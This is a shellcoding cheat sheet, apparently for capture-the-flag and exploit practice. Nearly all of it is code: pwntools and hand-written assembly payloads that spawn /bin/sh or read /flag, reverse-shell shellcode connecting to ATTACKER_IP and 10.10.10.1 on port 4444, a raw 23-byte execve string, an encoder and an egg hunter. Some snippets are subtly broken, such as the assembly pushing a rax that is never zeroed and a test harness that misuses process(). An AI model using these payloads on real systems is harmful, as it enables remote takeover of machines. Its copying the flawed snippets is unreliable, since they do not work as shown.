# Shellcoding

## Writing Shellcode with pwntools
```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

shellcode = asm(shellcraft.sh())
shellcode = asm(shellcraft.execve('/bin/sh', ['/bin/sh'], 0))
shellcode = asm(shellcraft.cat('/flag'))
shellcode = asm(shellcraft.connect('ATTACKER_IP', 4444) + shellcraft.dupsh())  # reverse shell
```

## Manual x86_64 execve Shellcode
```asm
; execve("/bin/sh", NULL, NULL)
xor rsi, rsi
xor rdx, rdx
mov rbx, 0x68732f6e69622f2f   ; "//bin/sh"
push rbx
push rax  ; null terminator (rax must be 0 first)
mov rdi, rsp
mov rax, 59  ; sys_execve
syscall
```

## Manual x86 (32-bit) execve Shellcode
```asm
xor eax, eax
push eax
push 0x68732f6e
push 0x69622f2f
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov eax, 11  ; sys_execve (32-bit)
int 0x80
```

## Restricted Character Shellcode (bad chars: \x00, \x0a, etc.)
```python
# Use alphanumeric or printable-only shellcode encoders
shellcode = asm(shellcraft.sh())
encoded = encode(shellcode, avoid=b'\x00\x0a\x0d')
```

## Egg Hunter (find shellcode in memory when space is limited)
```python
context.arch = 'i386'
egg = asm(shellcraft.egghunter('w00t'))
# Place actual shellcode elsewhere prefixed with 'w00tw00t' tag
```

## Shellcode Size Constraints
```python
# If space is very limited, use minimal shellcode
# execve /bin/sh in ~23 bytes (x86_64):
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

## Testing Shellcode Locally
```python
from pwn import *
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())
p = process(shellcode, executable='/bin/sh')  # not typical; usually test via binary injection

# Better: write standalone test harness
with open('sc.bin', 'wb') as f:
    f.write(shellcode)
```

## Bad Character Identification
```python
from pwn import *
p = process('./binary')
p.sendline(bytes(range(256)))  # send all byte values
# Compare what the program receives/echoes to find filtered/mangled bytes
```

## Reverse Shell Shellcode
```python
shellcode = asm(shellcraft.connect('10.10.10.1', 4444) + shellcraft.dupsh())
```

## Common Syscall Numbers (x86_64)
```
read     = 0
write    = 1
open     = 2
close    = 3
mmap     = 9
execve   = 59
socket   = 41
connect  = 42
```
